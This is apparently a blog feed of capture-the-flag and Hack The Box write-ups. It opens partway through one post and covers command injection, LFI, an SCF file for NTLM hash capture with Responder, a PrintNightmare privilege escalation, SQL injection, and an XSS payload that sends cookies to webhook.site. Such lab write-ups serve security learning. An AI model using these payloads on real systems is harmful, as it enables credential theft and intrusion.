Soeasypeasy214   (flag.zip/flag.txt)
1g 0:00:00:00 DONE (2022-03-11 20:32) 100.0g/s 15500p/s 15500c/s 15500C/s ##this will help you later..violent
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
┌─[daz@parrotos]─[~/Documents/1337UPCTF/Mirage]
└──╼ $unzip flag.zip 
Archive:  flag.zip
[flag.zip] flag.txt password: 
 extracting: flag.txt                
┌─[daz@parrotos]─[~/Documents/1337UPCTF/Mirage]
└──╼ $cat flag.txt 
1337UP{Wh4tAM3ss.txt.jpg.whyareyouputtingmethroughthis}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;traveler---web&quot;&gt;Traveler - Web&lt;/h1&gt;

&lt;p&gt;The link for the ‘Traveler’ challenge was https://traveller.ctf.intigriti.io/. There were no additional files with this challenge. Looking at the link its a travel agent based website.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/traveler.png&quot; alt=&quot;traveler&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Poking around the website I found a section to check availability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerinjection.png&quot; alt=&quot;travelerinjection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I sent the request to Burp and started fuzzing the pack name field.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerapi.png&quot; alt=&quot;travelerapi&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When submitting &lt;code class=&quot;highlighter-rouge&quot;&gt;Single'&lt;/code&gt;  an error was generated showing&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;An error occurred whilst executing: bash check.sh Couple’&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelererror.png&quot; alt=&quot;travelererror&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It doesn’t appear to be verifying user input so I should be able to just append bash commands to the syntax so I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;Single&amp;amp;ls&lt;/code&gt; because of the special character I URL encoded it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerls.png&quot; alt=&quot;travelerls&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It worked, so getting the flag was simple using the payload &lt;code class=&quot;highlighter-rouge&quot;&gt;pack=Single%26%63%61%74%20%2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67%2e%74%78%74&amp;amp;submit=Submit&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;cat ../../../flag.txt&lt;/code&gt; URL encoded.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/travelerflag.png&quot; alt=&quot;travelerflag&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;lovely-kitten-pictures-1---lovely-kitten-pictures&quot;&gt;Lovely Kitten Pictures 1 - Lovely Kitten Pictures&lt;/h1&gt;

&lt;p&gt;The link for the ‘Lovely Kitten Pictures 1’ challenge was https://lovelykittenpictures.ctf.intigriti.io/. No files were included as part of this challenge. Navigating to the website just showed a picture of a cat with an option to switch.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/cats.png&quot; alt=&quot;cats&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I sent the requests through Burp and saw a request to ‘/pictures.php?path=assets/1.jpg’. That looks it could be vulnerable to an LFI (Local File Inclusion).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/catsassets.png&quot; alt=&quot;catsassets&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I played around for a while trying the basics such as ../../../../flag.txt, ../../../../etc/passwd &amp;amp; etc but just got 404’s so decided to try ‘/pictures.php?path=pictures.php’ which if it worked would include the source code of the php file and I would be able to see how the request worked and it worked!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/intigritictf/catsflag.png&quot; alt=&quot;catsflag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Reading the code it looks like any file other than .jpg would return the contents of flag1.txt I look at the headers and the flag was included1.&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;==========================================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="intigriti" />
      
        <category term="ctf" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Driver Write Up</title>
      <link href="https://darrynbrownfield.co.uk/driver" rel="alternate" type="text/html" title="Driver Write Up" />
      <published>2022-02-27T00:00:00+00:00</published>
      <updated>2022-02-27T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/driver</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/driver">&lt;p&gt;&lt;img src=&quot;/assets/images/driver/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://app.hackthebox.com/machines/Driver&quot;&gt;Driver&lt;/a&gt; is a easy box from &lt;a href=&quot;https://hackthebox.com&quot;&gt;Hack The Box&lt;/a&gt;, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:20 GMT
Nmap scan report for 10.10.11.106
Host is up (0.020s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-28T00:20:49
|_  start_date: 2022-02-27T04:55:51

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;80 - HTTP - Microsoft IIS httpd 10.0&lt;/li&gt;
  &lt;li&gt;135 - MSRPC - Microsoft Windows RPC&lt;/li&gt;
  &lt;li&gt;445 - SMB - Microsoft Windows 7 - 10 microsoft-ds&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan and found winrm to be open on port 5985.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/all_ports 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:25 GMT
Nmap scan report for 10.10.11.106
Host is up (0.026s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The web service is showing an unauthorized response however it could be leaking a username with the message “Please enter password for admin”.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Before looking at the web service I tried enumerating SMB with various tools such as smbmap, smbclient and CrackMapExec however I had no joy.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cme smb 10.10.11.106
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
└──╼ $smbmap -H 10.10.11.106
[!] Authentication error on 10.10.11.106
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I turned my attention to the web service. Navigating to the IP I did get a login prompt. I tried admin:admin and got in!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/driver/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once logged in, I get a simple web page but an email address of ‘support@driver.htb’. I updated my host file with ‘driver.htb’ just in case I need it later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/driver/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The only link that works on the web page is ‘Firmware Updates’. This page provides an upload function. I played around with this for such a long time, trying attacks like XSS, uploading PHP shells but nothing worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/driver/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However re-reading the line:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I decided to change my google search to “http smb file share exploit” and found an article on using SCF files.&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;The first article that returned was from Penetration testing lab https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/. After reading the article I created the file test.scf using the example they provide and changed the IP to my VPN IP.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat test.scf 
[Shell]
Command=2
IconFile=\\10.10.14.11\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I started responder with the command ‘&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo responder -I tun0&lt;/code&gt;’.&lt;/p&gt;

&lt;p&gt;Then uploaded the file using the web upload function and got a hit from responder&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:87ea6d299d14fa32:ED6355EFB0444E974805B3FF0E0B9B26:0101000000000000803021AB042CD801AE67B0D5B0D050060000000002000800350054003400480001001E00570049004E002D0
0350032003700430037004C004F004F0030004300360004003400570049004E002D00350032003700430037004C004F004F003000430036002E0035005400340048002E004C004F00430041004C000300140035005400340048002E004C004F004
30041004C000500140035005400340048002E004C004F00430041004C0007000800803021AB042CD80106000400020000000800300030000000000000000000000000200000C974CDC12A32C5BFD81B375A1DECF3BF2FF300E27CB3440A6AC953C
7F84AACEA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I put the hash in to a file called ‘hash’ and used hashcat to crack it with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now I had a username and password I was able to use winrm to login. To login I used &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;Evil-WinRM&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $/opt/evil-winrm/evil-winrm.rb -u tony -i 10.10.11.106
Enter Password: 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Now I had a foothold, I did some basic enumeration of the box. Looking at the running services I could see the Windows print spooler service.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;    381      23     5164      14448 ...12            1128 spoolsv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This made me think of the PrintNightmare exploit. I could also have used rpcdump to find this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $rpcdump.py 10.10.11.106 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To exploit this I used the &lt;a href=&quot;https://github.com/calebstewart/CVE-2021-1675&quot;&gt;exploit&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/calebjstewart&quot;&gt;Caleb Stewart&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/_JohnHammond&quot;&gt;John Hammond&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I used git to clone the repo in to my /opt directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo git clone https://github.com/calebstewart/CVE-2021-1675.git
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (40/40), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
Receiving objects: 100% (40/40), 131.12 KiB | 932.00 KiB/s, done.
Resolving deltas: 100% (9/9), done.
┌─[daz@parrotos]─[/opt]
└──╼ $cd CVE-2021-1675
┌─[daz@parrotos]─[/opt/CVE-2021-1675]
└──╼ $ls
CVE-2021-1675.ps1  nightmare-dll  README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now using Evil-WinRM I can upload the powershell script and execute it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1

                                                             
Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = &quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&quot;
[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It worked! I canceled my current WinRM session and logged back in using the new credentials.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; exit

Info: Exiting with code 0

┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
└──╼ $/opt/evil-winrm/evil-winrm.rb -u adm1n -i 10.10.11.106
Enter Password: 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\adm1n\Documents&amp;gt; cd C:/Users/Administrator/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/26/2022   8:56 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats the box, thanks for reading!&lt;/p&gt;

&lt;p&gt;==========================================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="hackthebox" />
      
        <category term="ctf" />
      
        <category term="easy" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">HTB Cyber Santa CTF 2021 Web Write Up</title>
      <link href="https://darrynbrownfield.co.uk/htbcybersanta" rel="alternate" type="text/html" title="HTB Cyber Santa CTF 2021 Web Write Up" />
      <published>2021-12-05T00:00:00+00:00</published>
      <updated>2021-12-05T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/htbcybersanta</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/htbcybersanta">&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;This writeup is for the web challenges from the &lt;a href=&quot;https://www.hackthebox.com&quot;&gt;HackTheBox&lt;/a&gt; Cyber Santa is Coming to Town CTF that took place from Wednesday 01 December to Sunday 05 December.&lt;/p&gt;

&lt;p&gt;A big thank you to HTB for putting on a great event (as always). Check out their other CTF events at https://ctf.hackthebox.com.&lt;/p&gt;

&lt;h3 id=&quot;toy-workshop&quot;&gt;Toy Workshop&lt;/h3&gt;

&lt;p&gt;The description for this challenge was:&lt;/p&gt;

&lt;p&gt;“The work is going well on Santa’s toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?”&lt;/p&gt;

&lt;p&gt;The challenge had both a docker instance to active and downloadable content.&lt;/p&gt;

&lt;p&gt;Taking a look at the docker instance IP we get a simple web page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/workshop.gif&quot; alt=&quot;workshop&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Rather than spend time poking around the website I took a look at the code provided.&lt;/p&gt;

&lt;p&gt;In the routes/index.js file provides some additional paths, ‘/api/submit’ and ‘/queries’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;router.get('/', (req, res) =&amp;gt; {
	return res.render('index');
});

router.post('/api/submit', async (req, res) =&amp;gt; {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() =&amp;gt; {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});

router.get('/queries', async (req, res, next) =&amp;gt; {
	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()
		.then(queries =&amp;gt; {
			res.render('queries', { queries });
		})
		.catch(() =&amp;gt; res.status(500).send(response('Something went wrong!')));
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Two things jump out, the first the /api/submit page requires a POST request, if its accepted it will run ‘bot.readQueries(db);’. Next the /queries page is only accessible from 127.0.0.1.&lt;/p&gt;

&lt;p&gt;Taking a look at views/bot.js, the flag will be provided as a cookie and the readQueries function when called will set a cookie and call the queries page.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;const cookies = [{
	'name': 'flag',
	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];


const readQueries = async (db) =&amp;gt; {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.goto('http://127.0.0.1:1337/');
		await page.setCookie(...cookies);
		await page.goto('http://127.0.0.1:1337/queries', {
			waitUntil: 'networkidle2'
		});
		await browser.close();
		await db.migrate();
};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next reviewing the views/queries.hbs page, It looks like the page iterates through the queries.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;        &amp;lt;p class=&quot;pb-3&quot;&amp;gt;Welcome back, admin!&amp;lt;/p&amp;gt;
        &amp;lt;div class=&quot;dash-frame&quot;&amp;gt;
            
            &amp;lt;p&amp;gt;}&amp;lt;/p&amp;gt;
            
            &amp;lt;p class=&quot;empty&quot;&amp;gt;No content&amp;lt;/p&amp;gt;
            
        &amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So putting all this together I think we can use XSS to grab the cookie by sending a XSS payload in the API submit function. The cookie (flag) will be sent and the readQueries function will call the queries page, the XSS payload will fire and give our flag.&lt;/p&gt;

&lt;p&gt;First I tested sending a simple POST request using curl and got a response.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -X POST http://:/api/submit --header 'Content-Type: application/json' -d '{&quot;query&quot;:&quot;test&quot;}'
{&quot;message&quot;:&quot;Your message is delivered successfully!&quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used https://webhook.site to generate a URL I could use in the XSS payload. I then changed the payload to use a script tag to call the web hook site along with the cookie.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -X POST :/api/submit --header 'Content-Type: application/json' -d '{&quot;query&quot;:&quot;&amp;gt;&amp;lt;script&amp;gt;window.location='\''https://webho
ok.site//?c='\''.concat(document.cookie)&amp;lt;/script&amp;gt;&quot;}'
{&quot;message&quot;:&quot;Your message is delivered successfully!&quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On the webhook site was my request and the cookie.&lt;/p&gt;

&lt;h3 id=&quot;toy-management&quot;&gt;Toy Management&lt;/h3&gt;

&lt;p&gt;The description for Toy Management was:&lt;/p&gt;

&lt;p&gt;“The evil elves have changed the admin access to Santa’s Toy Management Portal. Can you get the access back and save the Christmas?”&lt;/p&gt;

&lt;p&gt;Again with both a docker instance to start and downloadable content. This time its just a login form. I tried “admin’– -“ in the username field and “admin” as the password and got in and got the flag!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/toymanagement.png&quot; alt=&quot;toymanagement&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;gadget-santa&quot;&gt;Gadget Santa&lt;/h3&gt;

&lt;p&gt;The description for Gadget Santa was:&lt;/p&gt;

&lt;p&gt;“It seems that the evil elves have broken the controller gadget for the good old candy cane factory! Can you team up with the real red teamer Santa to hack back?”&lt;/p&gt;

&lt;p&gt;Again this challenge had both a docker instance and downloadable content.&lt;/p&gt;

&lt;p&gt;Looking at the webpage, I appears I can select options to print output from the system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/gadgets.gif&quot; alt=&quot;gadgets&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The URL has a command parameter: http://:/?command=list_storage&lt;/p&gt;

&lt;p&gt;So I tried some basic linux commands and I got output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/commands.gif&quot; alt=&quot;commands&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, when ever I try and use a space I get no output. I can chain commands together using &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; but it still fails to show an output if I use a space.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/listfiles.gif&quot; alt=&quot;listfiles&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the source, there is a sanitize function which removes spaces from the command.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?php
class MonitorModel
{   
    public function __construct($command)
    {
        $this-&amp;gt;command = $this-&amp;gt;sanitize($command);
    }

    public function sanitize($command)
    {   
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
        return shell_exec('/santa_mon.sh '.$this-&amp;gt;command);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In a Python script shows the placeholder for the flag. The script is a web server running locally on port 3000.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;def http_server(host_port,content_type=&quot;application/json&quot;):
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -&amp;gt; None:
			def resp_ok():
				self.send_response(200)
				self.send_header(&quot;Content-type&quot;, content_type)
				self.end_headers()
			if self.path == '/':
				resp_ok()
				if check_service():
					self.wfile.write(get_json({'status': 'running'}))
				else:
					self.wfile.write(get_json({'status': 'not running'}))
				return
			elif self.path == '/restart':
				restart_service()
				resp_ok()
				self.wfile.write(get_json({'status': 'service restarted successfully'}))
				return
			elif self.path == '/get_flag':
				resp_ok()
				self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
				return
			self.send_error(404, '404 not found')
		def log_message(self, format, *args):
			pass
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

http_server(('127.0.0.1',3000))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I should be able to curl localhost:3000/get_flag to grab the flag. However I need to bypass the sanitization. To do this I can use &lt;code class=&quot;highlighter-rouge&quot;&gt;${IFS}&lt;/code&gt;. &lt;a href=&quot;https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions#bypass-forbidden-spaces&quot;&gt;HackTricks&lt;/a&gt; is a great resource for techniques like this.&lt;/p&gt;

&lt;p&gt;So with the URL “http://:/?command=;curl${IFS}localhost:3000/get_flag” I get the flag!&lt;/p&gt;

&lt;h3 id=&quot;elf-directory&quot;&gt;Elf Directory&lt;/h3&gt;

&lt;p&gt;The description for Elf Directory was:&lt;/p&gt;

&lt;p&gt;“Can you infiltrate the Elf Directory to get a foothold inside Santa’s data warehouse in the North Pole?”&lt;/p&gt;

&lt;p&gt;There is no downloadable content for this challenge just a docker instance to start.&lt;/p&gt;

&lt;p&gt;Going to the docker instance IP and port shows a login page, unfortunately no simple SQL bypass this time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/elfdirectory.png&quot; alt=&quot;elfdirectory&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried some basic default credentials but had no luck so created an account with the username d4zs3c and logged in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a message:&lt;/p&gt;

&lt;p&gt;“You don’t have permission to edit your profile, contact the admin elf to approve your account!”&lt;/p&gt;

&lt;p&gt;Now logged I checked the developer tools in Firefox and I have a PHPSESSID. I coped the cookie value and put it in &lt;a href=&quot;https://gchq.github.io&quot;&gt;CyberChef&lt;/a&gt; and used ‘From Base64’ operation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/cookie.png&quot; alt=&quot;cookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I removed the %3D which left with me &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;username&quot;:&quot;d4zs3c&quot;,&quot;approved&quot;:false}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Next I changed the input to &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;username&quot;:&quot;d4zs3c&quot;,&quot;approved&quot;:true}&lt;/code&gt; and used the ‘To Base64’. Using the developer tools I removed the value up until the %3d and pasted in my new base64 string which looked like: “eyJ1c2VybmFtZSI6ImQ0enMzYyIsImFwcHJvdmVkIjp0cnVlfQ==%3D”&lt;/p&gt;

&lt;p&gt;Now refreshing the page with my new cookie I get the option to upload a file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/approved.png&quot; alt=&quot;approved&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to upload a PHP file but got an error:&lt;/p&gt;

&lt;p&gt;“Invalid image. Only PNG images are supported.”&lt;/p&gt;

&lt;p&gt;So I downloaded an image of Santa (had to be) and tried to upload it but this time via Burp so I could modify it before its submitted. I appended the file name with .php and removed the contents of the file with a simple PHP script.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htbcybersanta/uploadbypass.gif&quot; alt=&quot;uploadbypass&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now all I need to do is browse to the file and I will have command execution and can read the flag.&lt;/p&gt;

